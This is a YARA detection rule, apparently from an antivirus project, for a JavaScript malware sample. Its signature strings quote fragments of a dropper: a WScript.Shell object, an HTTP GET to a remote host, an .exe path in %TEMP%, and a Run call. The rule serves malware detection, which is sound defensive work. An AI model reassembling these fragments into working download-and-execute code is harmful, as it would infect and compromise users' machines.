rule sig_20160328_ebf8bf5fdead6d5aba0e1dd6939c415b {
  meta:
    description = "datamaliciousorder - file 20160328_ebf8bf5fdead6d5aba0e1dd6939c415b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "314737bba6deefc575722ec4d1d9f548c04906591500b6f902765aed511a9f8f"

  strings:
    $s1  = "function Xppeoh() {return Scidfe[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"JMolK1dD2mTxRrO.exe\";};" fullword ascii
    $s2  = "Eljsypb[Oxylazvqc](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Horbzxnu](Qastcgvmha() * 11)} while (Eljsypb[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Isbrvzrme(Psmvieum, Enieybldk){return Psmvieum - Enieybldk;};" fullword ascii
    $s5  = "var Scidfe = function Rzvudzoyts() {return WScript[Uenutm](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Qraidtuc() {return ((Tggrsqt == true) && (Tggrsqt == Jdefhnwikb)) ? 1 : Wgdam;};" fullword ascii
    $s7  = "Tggrsqt = true; " fullword ascii
    $s8  = "var Qytzlkip = new this[\"Date\"]();" fullword ascii
    $s9  = "function Cqitcugv(){return Uenutm;};" fullword ascii
    $s10 = " while (Zynfcuan){" fullword ascii
    $s11 = "function Yycnjav(){return Meiaujuw;};" fullword ascii
    $s12 = "return Isbrvzrme(Fktrlfeby, Ybqirkt);" fullword ascii
    $s13 = "function Clgjnqs(Euzjopd) {var Qrkowkvtl = (1, 2, 3, 4, 5, Euzjopd); return Qrkowkvtl;};" fullword ascii
    $s14 = "var Tggrsqt = false;" fullword ascii
    $s15 = "function Qastcgvmha(){return 22;};" fullword ascii
    $s16 = "Jdefhnwikb = true; " fullword ascii
    $s17 = "var Jdefhnwikb = false;" fullword ascii
    $s18 = "var Uhzyovinp = false;" fullword ascii
    $s19 = "function Fkreefxv()" fullword ascii
    $s20 = "function Qfcavk(Okpfmnmdgc){Scidfe[\"Run\"](Okpfmnmdgc, Wgdam, Wgdam);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}